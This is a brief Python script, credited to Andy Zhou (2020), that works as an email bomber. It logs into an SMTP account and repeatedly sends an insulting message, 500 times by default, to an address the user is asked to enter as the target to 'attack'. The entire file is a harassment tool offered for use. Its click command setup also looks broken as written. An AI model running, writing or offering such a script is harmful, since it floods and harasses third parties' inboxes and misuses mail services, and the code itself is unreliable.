"""
Copyright(c) 2020 Andy Zhou
This is a spammer program to spam your own email or another person's.
"""

import smtplib
import os
from time import sleep
from email.mime.text import MIMEText
import click

sender = os.getenv('EMAIL', input('Your Email:'))
passwd = os.getenv('PASSWORD', input('Your Password(not saved): '))
subject = 'python email spammer'
content = 'Hello, Motherfxxker!' # polite words :)


s = smtplib.SMTP(os.getenv('EMAIL_SERVER', input('Your email\'s smtp address:')), 587)
s.starttls()
s.login(sender,passwd)


@click.command()
@click.option('--count', default="500")
def bomber(receiver, count):
    msg = MIMEText(content,'plain','utf-8')
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = receiver
    for i in range(int(count)):
        try:
            s.sendmail(sender,receiver,msg.as_string())
            click.echo(f'Email No.{i} succeeded. :)')
            sleep(0.5) # avoid connection close
        except:
            continue


bomber(os.getenv('ANOTHER_EMAIL', input('The email you want to attack: ')))
